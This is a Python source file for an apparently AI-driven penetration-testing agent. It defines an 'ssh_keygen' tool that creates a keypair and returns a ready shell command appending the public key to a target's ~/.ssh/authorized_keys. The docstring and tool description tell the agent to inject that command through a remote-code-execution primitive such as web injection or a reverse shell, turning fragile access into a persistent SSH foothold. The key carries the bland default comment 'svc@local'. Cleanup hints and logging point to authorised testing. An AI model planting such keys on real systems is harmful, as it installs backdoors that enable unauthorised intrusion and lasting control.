"""Generate an SSH keypair for foothold persistence.

The private key is written to the engagement's key dir and its path returned;
the PUBLIC key + a ready-to-use authorized_keys append command are returned for
the agent to inject through whatever command-execution primitive it has. After
injecting, authenticate cleanly with ssh_exec(key_file=<private_key_path>).
"""
import os
import subprocess
from core import proc as runner
import tempfile
from typing import Optional

from core.paths import keys_dir


def ssh_keygen(label: Optional[str] = None, comment: str = "svc@local") -> dict:
    if not _which("ssh-keygen"):
        return {"error": "ssh-keygen not found in PATH"}

    key_dir = keys_dir()                  # inside the assessment folder when active
    key_dir.mkdir(parents=True, exist_ok=True)
    import re
    safe = re.sub(r"[^A-Za-z0-9_-]", "_", label or "foothold")
    # unique private key path
    fd, base = tempfile.mkstemp(prefix=f"{safe}_", dir=str(key_dir))
    os.close(fd)
    os.unlink(base)                       # ssh-keygen wants the path to not exist
    priv = base
    pub = base + ".pub"

    try:
        proc = runner.run(
            ["ssh-keygen", "-t", "ed25519", "-N", "", "-C", comment, "-f", priv],
            capture_output=True, text=True, timeout=30,
        )
        if proc.returncode != 0:
            return {"error": f"ssh-keygen failed: {proc.stderr.strip()}"}
        with open(pub, encoding="utf-8") as f:
            public_key = f.read().strip()
        try:
            os.chmod(priv, 0o600)
        except Exception:
            pass

        append_cmd_unix = (
            f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            f"echo '{public_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
        )
        return {
            "public_key": public_key,
            "private_key_path": priv,
            "append_command": append_cmd_unix,
            "cleanup_hint": f"remove the line containing '{comment}' from the target's ~/.ssh/authorized_keys",
            "note": ("Inject 'append_command' (or just 'public_key') into the target via your RCE "
                     "primitive, then run ssh_exec with key_file=private_key_path for clean access. "
                     "Record this with record_persistence (kind=authorized_key)."),
            "_command": f"ssh-keygen -t ed25519 -C {comment} -f {priv}",
        }
    except subprocess.TimeoutExpired:
        return {"error": "ssh-keygen timed out"}


def _which(name: str) -> bool:
    import shutil
    return shutil.which(name) is not None


TOOL_DEFINITION = {
    "name": "ssh_keygen",
    "description": (
        "Generate an ed25519 SSH keypair to stabilise a foothold. Returns the public key and a "
        "ready authorized_keys append command (and the saved private key path). Inject the public "
        "key into the target's ~/.ssh/authorized_keys via your command-execution primitive (web "
        "injection, reverse shell, etc.), then authenticate cleanly with ssh_exec using "
        "key_file=<private_key_path>. This converts fragile/blind RCE into reliable framed command "
        "execution. Always record what you plant with record_persistence."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "label": {"type": "string", "description": "Short label for the key file (e.g. host or user)."},
            "comment": {"type": "string", "description": "Key comment (default 'svc@local') — used to find/remove it during cleanup."},
        },
        "required": [],
    },
}
